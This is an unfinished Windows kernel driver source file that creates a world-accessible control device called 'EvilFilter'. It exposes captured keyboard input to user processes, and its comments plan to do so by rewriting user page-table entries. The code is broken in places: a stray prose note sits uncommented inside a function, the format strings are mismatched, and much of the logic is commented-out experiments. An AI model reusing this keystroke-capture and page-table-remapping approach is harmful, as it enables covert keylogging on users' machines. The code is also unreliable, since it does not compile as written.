#include <ntddk.h>
#include <wdf.h>
//#include <ntddkbd.h>   
#include <ControlDevice.h>
#include <PageTableManipulation.h>
#include <SharedHeader.h>

WDFDEVICE ControlDevice;
extern PKEYBOARD_INPUT_DATA keyboardBuffer;



/*
NTSTATUS ObReferenceObjectByHandle(
_In_       HANDLE Handle,
_In_       ACCESS_MASK DesiredAccess,
_In_opt_   POBJECT_TYPE ObjectType,
_In_       KPROCESSOR_MODE AccessMode,
_Out_      PVOID *Object,
_Out_opt_  POBJECT_HANDLE_INFORMATION HandleInformation
);*/


/** /
VOID play(HANDLE handle) {

	NTSTATUS status;
	extern POBJECT_TYPE  *PsProcessType;
	PEPROCESS peProcess;
	POBJECT_TYPE peProcessObjectType = ObGetObjectType(peProcess);

	status = ObReferenceObjectByHandle(handle, GENERIC_READ, NULL, UserMode, &peProcess, NULL);


}


VOID play2() {
	PEPROCESS peProcess = IoGetCurrentProcess();
	IoGetProcessId 

}
/**/

VOID PrintPteData(PVOID VirtualAddress) {

	PVOID PDEaddress = (((ULONG)VirtualAddress >> 20) & (~0x3)) + 0xC0300000;
	PVOID PTEaddress = (((ULONG)VirtualAddress >> 10) & (~0x3)) + 0xC0000000;

	//PPTE ppte = GetPteAddress(VirtualAddress);
	//ULONG pfa = GetPhysicalFrameAddress(ppte);

	KdPrint((" PDE/PTE are [0x%lx] [0x%lx] [0x%lx]\n", PDEaddress, PTEaddress));


}



NTSTATUS CreateControlDevice(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath) {
	KdPrint(("CreateControlDevice IRQ Level [%u]", KeGetCurrentIrql()));

	NTSTATUS status;
	PWDFDEVICE_INIT ControlDeviceInit;
	WDF_OBJECT_ATTRIBUTES ControlDeviceAttributes;
	WDFDRIVER Driver;
	WDF_DRIVER_CONFIG       DriverConfig;
	WDF_IO_QUEUE_CONFIG         ioQueueConfig;
	WDFQUEUE                    queue;

	WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	WDF_DRIVER_CONFIG_INIT(&DriverConfig, WDF_NO_EVENT_CALLBACK);

	//WDF_OBJECT_ATTRIBUTES_INIT(&Attributes);
	// TODO: Attributes.EvtCleanupCallback = EvtDriverContextCleanup;

	status = WdfDriverCreate(DriverObject, RegistryPath, &ControlDeviceAttributes, &DriverConfig, &Driver);

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDriverCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDriverCreate Succeededx\n"));
	}

	ControlDeviceInit = WdfControlDeviceInitAllocate(Driver, &SDDL_DEVOBJ_SYS_ALL_ADM_RWX_WORLD_RWX_RES_RWX);

	DECLARE_CONST_UNICODE_STRING(ntDeviceName, L"\\Device\\EvilFilter");
	DECLARE_CONST_UNICODE_STRING(symbolicLinkName, L"\\DosDevices\\EvilFilter");

	status = WdfDeviceInitAssignName(ControlDeviceInit, &ntDeviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceInitAssignName FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceInitAssignName Succeeded\n"));
	}

	//WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&ControlDeviceAttributes, CONTROL_DEVICE_EXTENSION);
	status = WdfDeviceCreate(&ControlDeviceInit, &ControlDeviceAttributes, &ControlDevice);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreate Succeeded\n"));
	}

	status = WdfDeviceCreateSymbolicLink(ControlDevice, &symbolicLinkName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfDeviceCreateSymbolicLink FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfDeviceCreateSymbolicLink Succeeded\n"));
	}

	WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&ioQueueConfig, WdfIoQueueDispatchSequential);
	ioQueueConfig.DefaultQueue = TRUE;
	ioQueueConfig.EvtIoDefault = ReadKeyboardBuffer;
	status = WdfIoQueueCreate(ControlDevice, &ioQueueConfig, WDF_NO_OBJECT_ATTRIBUTES, &queue); // pointer to default queue

	if (!NT_SUCCESS(status)) {
		KdPrint(("WdfIoQueueCreate FAILED 0x%lx\n", status));
		return status;
	}
	else {
		KdPrint(("WdfIoQueueCreate Succeeded\n"));
	}
	WdfControlFinishInitializing(ControlDevice);

	KdPrint(("WdfControlFinishInitializing finished\n"));

	return status;
	// ControlDevice
}

_Use_decl_annotations_
VOID ReadKeyboardBuffer(_In_ WDFQUEUE Queue, _In_ WDFREQUEST Request) {

	UNREFERENCED_PARAMETER(Queue);

	KdPrint(("ReadKeyboardBuffer IRQ Level [%u]\n", KeGetCurrentIrql()));

	NTSTATUS                  status;
	//	WDF_REQUEST_PARAMETERS    params;
	WDFMEMORY memoryHandle;
	//PVOID memoryPointer;
	size_t Length;

	//WDF_REQUEST_PARAMETERS_INIT(&params);
	//WdfRequestGetParameters(Request, &params);
	if (keyboardBuffer) {



		/** /
		PVOID mappedBuffer = MmGetSystemAddressForMdlSafe(keyboardBuffer, NormalPagePriority);
		if (mappedBuffer) {

			KdPrint(("MmGetSystemAddressForMdlSafe success :-)))) \n"));
			PMDL mdl = NULL;
			WdfRequestRetrieveOutputWdmMdl(Request, &mdl);
			mdl->



		}
		else {

			KdPrint(("MmGetSystemAddressForMdlSafe FAILED :-( \n"));
		}
		/**/



		Length = sizeof(PKEYBOARD_INPUT_DATA); 

		WDF_OBJECT_ATTRIBUTES  attributes;
		WDF_OBJECT_ATTRIBUTES_INIT(&attributes);


		status = WdfRequestRetrieveOutputMemory(Request, &memoryHandle);
		//status = WdfMemoryCreate(&attributes, NonPagedPool, 0, Length, &memoryHandle, &memoryPointer);
		

		if (!NT_SUCCESS(status)) {
			KdPrint(("ReadKeyboardBuffer Could not create memory buffer 0x%x\n", status));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer memory buffer created.\n"));
		}

		PSHARED_MEMORY_STRUCT userSharedMemory = (PSHARED_MEMORY_STRUCT)WdfMemoryGetBuffer(memoryHandle, NULL);
		if (!(userSharedMemory)) {
			KdPrint(("ReadKeyboardBuffer WdfMemoryGetBuffer failed:\n"));
			WdfVerifierDbgBreakPoint();
			WdfRequestCompleteWithInformation(Request, status, 0L);
			return;
		}
		else {


			HANDLE clientProcessHandle = userSharedMemory->ClientProcessHandle;
			PVOID  clientMemory = userSharedMemory->ClientMemory;
			PPTE userPageTable = userSharedMemory->PageTable;

			if (userPageTable) {
				KdPrint(("ReadKeyboardBuffer userPageTable is [0x%lx] [0x%lx]\n", clientMemory, userPageTable));



				ULONG pageDirectoryIndex = (ULONG)clientMemory >> 21;
				ULONG pageTableIndex = (ULONG)clientMemory >> 12 & 0x01FF;
				ULONG offset = (ULONG)clientMemory & 0x0fff;

				ULONG ptPFN = userPageTable->PageFrameNumber;
				ULONG baseAddress = ptPFN << 12;
				ULONG finalPhysicalAddress = baseAddress + offset;

				KdPrint(("ReadKeyboardBuffer Client Buffer Address is [0x%lx]\n", finalPhysicalAddress));


				So now we have the user space page table, from which we can get the correct physical address
				Hopefully now we can walk down this address to rewrite its memory location.....that is the task
				for the morning :-)


			}
			else {
				KdPrint(("ReadKeyboardBuffer userPageTable is NULL\n"));
			}
			/** /
			PKEYBOARD_INPUT_DATA userKeyboardBuffer = (PKEYBOARD_INPUT_DATA)clientMemory;

			KdPrint(("ReadKeyboardBuffer WdfMemoryGetBuffer success. [0x%lx] [0x%lx]\n", userKeyboardBuffer, MmGetPhysicalAddress(userKeyboardBuffer)));
			KdPrint(("ReadKeyboardBuffer Make Code is [%c]:\n", userKeyboardBuffer->MakeCode));


			ULONG physicalAddress = GetPhysAddressPhysicallyWithProcessHandle(clientMemory, clientProcessHandle);
			KdPrint(("ReadKeyboardBuffer physicalAddress of user-supplied memory is [0x%lx]\n", physicalAddress));
			/**/
			//KdPrint(("ReadKeyboardBuffer KMDF keyboardBuffer "));
			//PrintPteData(keyboardBuffer);
			//KdPrint(("ReadKeyboardBuffer user keyboardBuffer "));
			//PrintPteData(userKeyboardBuffer);


			// TODO: see if this will work......
			// actually, we will need to make sure the values are aligned.....so
			// maybe I should send several addresses of different alignments....
			// or do this as a 2-step communication.  First the client asks for the virtual address, or at least the offset
			// and then it constructs a virtual address with that offset, which it passes on to us here.
			// or it just passes a large block of void memory and we find a good spot in there to use.  and send back the first few bytes with a code
			// for determining it.
			//PPTE kmdfPpte = GetPteAddress(keyboardBuffer);
			//PPTE userPpte = GetPteAddress(userKeyboardBuffer);
			//userPpte->PageFrameNumber = kmdfPpte->PageFrameNumber;


		}

		/** /


		status = WdfMemoryCopyFromBuffer(memoryHandle, 0, keyboardBuffer, Length);
		if (!NT_SUCCESS(status)) {
			KdPrint(("ReadKeyboardBuffer: WdfMemoryCopyFromBuffer failed 0x%x\n", status));
			WdfRequestComplete(Request, status);
			return;
		}
		else {
			KdPrint(("ReadKeyboardBuffer WdfMemoryCopyFromBuffer successful.\n"));
		}
		/**/
	}
	else {
		KdPrint(("keyboardBuffer not yet set....plz wait\n"));
		Length = 0;
		status = STATUS_RESOURCE_DATA_NOT_FOUND;
	}
	// Set transfer information
	WdfRequestSetInformation(Request, (ULONG_PTR)Length);
	WdfRequestComplete(Request, status);


}
